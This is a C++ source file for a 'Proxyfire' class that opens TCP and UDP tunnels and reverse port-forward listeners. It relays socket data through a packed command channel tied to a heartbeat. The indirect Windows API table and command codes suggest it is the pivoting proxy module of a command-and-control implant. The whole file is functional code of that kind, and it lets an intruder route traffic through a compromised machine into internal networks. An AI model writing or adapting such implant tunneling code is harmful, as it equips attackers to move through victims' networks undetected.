#include "Proxyfire.h"

void* Proxyfire::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

void Proxyfire::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(Proxyfire));
}

void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, ULONG type, ULONG result)
{
	packer->Pack32(channelId);
	packer->Pack32(commandId);
	packer->Pack32(type);
	packer->Pack32(result);
}

void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize )
{
	packer->Pack32(channelId);
	packer->Pack32(COMMAND_TUNNEL_WRITE_TCP);
	packer->PackBytes(data, dataSize);
}

void Proxyfire::AddProxyData(ULONG channelId, ULONG type, SOCKET sock, ULONG waitTime, ULONG mode, ULONG address, WORD port, ULONG state)
{
	TunnelData tunnelData = { 0 };
	tunnelData.channelID = channelId;
	tunnelData.type      = type;
	tunnelData.sock      = sock;
	tunnelData.waitTime  = waitTime;
	tunnelData.mode      = mode;
	tunnelData.state     = state;
	tunnelData.i_address = address;
	tunnelData.port      = port;
	tunnelData.startTick = ApiWin->GetTickCount();
	this->tunnels.push_back(tunnelData);
}

//////////

SOCKET listenSocket(u_short port, int stream)
{
	WSAData WSAData;
	if (ApiWin->WSAStartup(514u, &WSAData) < 0)
		return -1;

	SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
		return -1;

	struct sockaddr_in saddr = { 0 };
	saddr.sin_family = AF_INET;
	saddr.sin_port = _htons(port);

	u_long argp = 1;
	int result = ApiWin->ioctlsocket(sock, FIONBIO, &argp);
	if (result != -1) {

		result = ApiWin->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr));
		if (result != -1) {

			result = ApiWin->listen(sock, stream);
			if (result != -1) {
				return sock;
			}
		}
	}
	ApiWin->closesocket(sock);
	return -1;
}

void Proxyfire::ConnectMessageTCP(ULONG channelId, ULONG type, CHAR* address, WORD port, Packer* outPacker)
{
	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
		if (sock != -1) {
			hostent* host = ApiWin->gethostbyname(address);
			if (host) {
				sockaddr_in socketAddress = { 0 };
				memcpy(&socketAddress.sin_addr, *(const void**)host->h_addr_list, host->h_length); 				//memmove
				socketAddress.sin_family = AF_INET;
				socketAddress.sin_port = _htons(port);

				DWORD timeout = 100;
				ApiWin->setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
				ApiWin->setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

				u_long mode = 1;
				ApiWin->ioctlsocket(sock, FIONBIO, &mode);

				int result = ApiWin->connect(sock, (sockaddr*)&socketAddress, sizeof(socketAddress));
				if (result == 0) {
					this->AddProxyData(channelId, type, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
					ApiWin->WSACleanup();
					return;
				}

				int connectError = ApiWin->WSAGetLastError();
				if (connectError != WSAEWOULDBLOCK) {
					ApiWin->closesocket(sock);
					ApiWin->WSACleanup();
					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, connectError);
					return;
				}

				fd_set writefds;
				FD_ZERO(&writefds);
				FD_SET(sock, &writefds);
				timeval tv = { 0, 100000 };

				int selectResult = ApiWin->select(0, NULL, &writefds, NULL, &tv);

				if (selectResult > 0 && ApiWin->__WSAFDIsSet((SOCKET)(sock), (fd_set FAR*)(&writefds))) {
					int sockError = 0;
					int len = sizeof(sockError);
					ApiWin->getsockopt(sock, SOL_SOCKET, SO_ERROR, (char*)&sockError, &len);

					if (sockError == 0) {
						this->AddProxyData(channelId, type, sock, 30000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_CONNECT);
						return;
					}
					else {
						ApiWin->closesocket(sock);
						PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, sockError);
					}
				}
				else {
					ApiWin->closesocket(sock);
					PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, WSAETIMEDOUT);
				}
			}
		}

		ULONG error = ApiWin->WSAGetLastError();

		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, type, error);
	}
}

void Proxyfire::ConnectMessageUDP(ULONG channelId, CHAR* address, WORD port, Packer* outPacker)
{
	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		ApiWin->WSACleanup();
		return;
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_DGRAM, 0);
		if (sock != -1) {
			hostent* host = ApiWin->gethostbyname(address);
			if (host) {
				ULONG addr = 0;
				memcpy(&addr, *(const void**)host->h_addr_list, 4); 				//memmove
				sockaddr_in socketAddress = { 0 };
				socketAddress.sin_family = AF_INET;
				if (ApiWin->bind(sock, (sockaddr*)&socketAddress, sizeof(socketAddress)) == 0) {
					u_long mode = 1;
					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
						this->AddProxyData(channelId, 2, sock, 30000, TUNNEL_MODE_SEND_UDP, addr, port, TUNNEL_STATE_CONNECT);
						return;
					}
				}
			}
		}
		ULONG error = ApiWin->WSAGetLastError();

		ApiWin->closesocket(sock);
		PackProxyStatus(outPacker, channelId, COMMAND_TUNNEL_START_TCP, 2, error);
	}
}

void Proxyfire::ConnectWriteTCP(ULONG channelId, CHAR* data, ULONG dataSize)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY) {
			DWORD finishTick = ApiWin->GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;
			
			while (ApiWin->GetTickCount() < finishTick) {
				writefds.fd_array[0] = tunnelData->sock;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
					if (ApiWin->send(tunnelData->sock, data, dataSize, 0) != -1 || ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)
						return;
					ApiWin->Sleep(1000);
				}
			}
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectWriteUDP(ULONG channelId, CHAR* data, ULONG dataSize)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if ( tunnelData->channelID == channelId && tunnelData->state == TUNNEL_STATE_READY ) {
			DWORD finishTick = ApiWin->GetTickCount() + 30000;
			timeval timeout = { 0, 100 };
			fd_set exceptfds;
			fd_set writefds;
			while (ApiWin->GetTickCount() < finishTick) {
				writefds.fd_array[0] = tunnelData->sock;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
					sockaddr_in addr_to;
					addr_to.sin_family = AF_INET;
					addr_to.sin_port = _htons(tunnelData->port);
					addr_to.sin_addr.S_un.S_addr = tunnelData->i_address;

					ApiWin->sendto(tunnelData->sock, data, dataSize, 0, (const struct sockaddr*)&addr_to, 16);
				}
			}
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectClose(ULONG channelId)
{
	TunnelData* tunnelData;
	for (int i = 0; i < tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->channelID == channelId && tunnelData->state != TUNNEL_STATE_CLOSE) {
			tunnelData->state = TUNNEL_STATE_CLOSE;
			break;
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ConnectMessageReverse(ULONG tunnelId, WORD port, Packer* outPacker)
{
	for (int i = 0; i < tunnels.size(); i++) {
		TunnelData tunnelData = this->tunnels[i];
		if (tunnelData.mode == TUNNEL_MODE_REVERSE_TCP && tunnelData.port == port && tunnelData.state != TUNNEL_STATE_CLOSE) {
			PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, tunnelData.type, TUNNEL_CREATE_ERROR);
			return;
		}
	}

	SOCKET sock = listenSocket(port, 10);
	if (sock == -1) {
		PackProxyStatus(outPacker,tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_CREATE_ERROR);
		return;
	}
	
	this->AddProxyData(tunnelId, 5, sock, 0, TUNNEL_MODE_REVERSE_TCP, 0, port, TUNNEL_STATE_CONNECT);

	PackProxyStatus(outPacker, tunnelId, COMMAND_TUNNEL_REVERSE, 5, TUNNEL_STATE_CONNECT);
}

///////////////////

void Proxyfire::CheckProxy(Packer* packer)
{
	TunnelData* tunnelData;
	timeval timeout = { 0, 100 };
	for (int i = 0; i < this->tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_CONNECT) {
			ULONG channelId = tunnelData->channelID;
			fd_set readfds;
			readfds.fd_count = 1;
			readfds.fd_array[0] = tunnelData->sock;
			fd_set exceptfds;
			exceptfds.fd_count = 1;
			exceptfds.fd_array[0] = tunnelData->sock;
			fd_set writefds;
			writefds.fd_count = 1;
			writefds.fd_array[0] = tunnelData->sock;
			ApiWin->select(0, &readfds, &writefds, &exceptfds, &timeout);
			
			if ( tunnelData->mode == TUNNEL_MODE_REVERSE_TCP ) {

				if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
					SOCKET sock = ApiWin->accept(tunnelData->sock, 0, 0);
					u_long mode = 1;
					if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) == -1) {
						ApiWin->closesocket(sock);
						continue;
					}

					ULONG cid = GenerateRandom32();

					packer->Pack32(tunnelData->channelID); // tunnel ID
					packer->Pack32(COMMAND_TUNNEL_ACCEPT);
					packer->Pack32(cid);

					this->AddProxyData(cid, 5, sock, 180000, TUNNEL_MODE_SEND_TCP, 0, 0, TUNNEL_STATE_READY);
				}
			}
			else {
				if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {
					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
						continue;
					}
					if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
						tunnelData->state = TUNNEL_STATE_READY;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
						continue;
					}
				}
				else {
					if (tunnelData->mode == TUNNEL_MODE_SEND_TCP) {
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &exceptfds)) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &writefds)) {
							tunnelData->state = TUNNEL_STATE_READY;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
							continue;
						}
						if (ApiWin->__WSAFDIsSet(tunnelData->sock, &readfds)) {
							SOCKET listenSock = tunnelData->sock;
							SOCKET tmp_sock_2 = ApiWin->accept(listenSock, 0, 0);
							if (tmp_sock_2 == -1) {
								tunnelData->state = TUNNEL_STATE_CLOSE;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
							}
							else {
								tunnelData->sock = tmp_sock_2;
								tunnelData->state = TUNNEL_STATE_READY;
								PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_SUCCESS);
							}
							ApiWin->closesocket(listenSock);
							continue;
						}
					}
				}
				if (ApiWin->GetTickCount() - tunnelData->startTick > tunnelData->waitTime) {
					tunnelData->state = TUNNEL_STATE_CLOSE;
					PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
				}
			}
		}
	}
	tunnelData = NULL;
}

ULONG Proxyfire::RecvProxy(Packer* packer)
{
	ULONG count = 0;
	LPVOID buffer = MemAllocLocal(0x10000);
	TunnelData* tunnelData;
	for (int i = 0; i < this->tunnels.size(); i++) {
		// Limit total data per tick to prevent blocking heartbeat (~4MB)
		if (packer->datasize() > 0x400000)
			break;
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_READY) {
			if (tunnelData->mode == TUNNEL_MODE_SEND_UDP) {

				LPVOID buffer = MemAllocLocal(0xFFFFC);
				struct sockaddr_in clientAddr = { 0 };
				int clientAddrLen = sizeof(sockaddr_in);

				int readed = ApiWin->recvfrom(tunnelData->sock, (CHAR*) buffer, 0xFFFFC, 0, (struct sockaddr*)&clientAddr, &clientAddrLen);
				if (readed == -1) {
					if (ApiWin->WSAGetLastError() != WSAEWOULDBLOCK) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
 				   }
				}
				else if (readed) {
					PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, readed);
					++count;
				}
				MemFreeLocal(&buffer, 0xFFFFC);
			}
			else {
				int max_reads = 16;
				while (max_reads-- > 0) {
					int readed = ApiWin->recv(tunnelData->sock, (char*)buffer, 0x10000, 0);

					if (readed > 0) {
						PackProxyData(packer, tunnelData->channelID, (PBYTE)buffer, readed);
						++count;
					}
					else if (readed == 0) {
						tunnelData->state = TUNNEL_STATE_CLOSE;
						PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
						break;
					}
					else if (readed == -1) {
						int err = ApiWin->WSAGetLastError();
						if (err != WSAEWOULDBLOCK) {
							tunnelData->state = TUNNEL_STATE_CLOSE;
							PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, tunnelData->type, TUNNEL_CREATE_ERROR);
						}
						break; // WOULDBLOCK or Error, stop reading this tunnel for now
					}
				}
			}
		}
	}
	MemFreeLocal(&buffer, 0x10000);
	tunnelData = NULL;
	return count;
}

void Proxyfire::CloseProxy()
{
	TunnelData* tunnelData;
	for (int i = 0; i < this->tunnels.size(); i++) {
		tunnelData = &(this->tunnels[i]);
		if (tunnelData->state == TUNNEL_STATE_CLOSE) {
			
			if (tunnelData->closeTimer == 0) {
				tunnelData->closeTimer = ApiWin->GetTickCount();
				continue;
			}

			if (tunnelData->closeTimer + 1000 < ApiWin->GetTickCount()) {
				if (tunnelData->mode == TUNNEL_MODE_SEND_TCP || tunnelData->mode == TUNNEL_MODE_SEND_UDP)
					ApiWin->shutdown(tunnelData->sock, 2);
				
				if (ApiWin->closesocket(tunnelData->sock) && tunnelData->mode == TUNNEL_MODE_REVERSE_TCP)
					continue;

				this->tunnels.remove(i);
				--i;
			}
		}
	}
	tunnelData = NULL;
}

void Proxyfire::ProcessTunnels(Packer* packer)
{
	if (!this->tunnels.size())
		return;

	this->CheckProxy(packer);

	ULONG finishTick = ApiWin->GetTickCount() + 2500;
	while ( this->RecvProxy(packer) && ApiWin->GetTickCount() < finishTick );

	this->CloseProxy();
}